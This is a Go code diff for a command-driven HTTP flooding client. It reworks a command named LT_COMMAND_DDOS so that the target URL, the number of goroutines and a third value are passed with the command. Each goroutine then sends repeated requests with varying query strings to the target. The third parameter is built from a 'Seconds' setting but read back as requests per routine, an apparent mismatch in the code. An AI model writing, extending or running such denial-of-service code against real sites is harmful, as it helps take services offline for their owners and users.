@@ -69,7 +69,15 @@ func getCommand() (command utils.CommandType, err error) {
 		return utils.CommandType{2, utils.LT_COMMAND_STOP, nil}, err
 	}
 
-	cmd = utils.CommandType{1, utils.LT_COMMAND_DDOS, nil}
+	cmd = utils.CommandType{
+		1,
+		utils.LT_COMMAND_DDOS,
+		[]interface{}{
+			settings.Url,
+			settings.NumberOfRoutines,
+			settings.Seconds,
+		},
+	}
 
 	ok, err := utils.IsCorrectCommand(cmd)
 	if !ok {
@@ -100,8 +108,13 @@ func main() {
 
 			switch command.Name {
 			case utils.LT_COMMAND_DDOS:
-				for i := 0; i < settings.NumberOfRoutines; i++ {
-					go performMultiRequest(settings.Url+"?a="+strconv.Itoa(i), settings.RequPerRoutine, c)
+
+				var url string = command.Params[0].(string)
+				var numOfRoutines int = command.Params[1].(int)
+				var requPerRoutine int = command.Params[2].(int)
+
+				for i := 0; i < numOfRoutines; i++ {
+					go performMultiRequest(url+"?a="+strconv.Itoa(i), requPerRoutine, c)
 				}
 
 			case utils.LT_COMMAND_STOP:
